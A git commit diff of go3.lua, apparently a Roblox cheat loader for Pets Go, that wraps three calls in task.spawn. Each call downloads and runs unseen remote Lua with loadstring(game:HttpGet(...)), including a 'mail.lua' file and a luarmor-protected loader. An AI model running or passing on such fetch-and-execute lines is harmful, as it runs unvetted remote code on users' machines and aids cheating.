d0c872786960272567d4819015fa1e7705b8cdde
Grogutech <110765236+Grogutech@users.noreply.github.com>
2024-11-17 08:58:10 +0300

    Update go3.lua

--- go3.lua
+++ go3.lua
@@ -1,10 +1,15 @@
 _G.Config = { UserID = "752adf06-faf4-40f9-8f22-9c9bca3aa5e3", discord_id = "314107374715535370" , Note = "Pc", } 
 
-pcall(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/skadidau/unfazedfree/refs/heads/main/petsgo"))()
+task.spawn(function()
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/skadidau/unfazedfree/refs/heads/main/petsgo"))()
+    end)
 end)
-pcall(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/Grogutech/beb/refs/heads/main/mail.lua"))()
+
+task.spawn(function()
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Grogutech/beb/refs/heads/main/mail.lua"))()
+    end)
 end)
 
 -- Load other scripts
@@ -32,6 +37,8 @@ getgenv().Settings = {
     }
 }
 
-pcall(function()
-    loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/957ebb42504c2c23a15c8e78a4758f38.lua"))()
+task.spawn(function()
+    pcall(function()
+        loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/957ebb42504c2c23a15c8e78a4758f38.lua"))()
+    end)
 end)
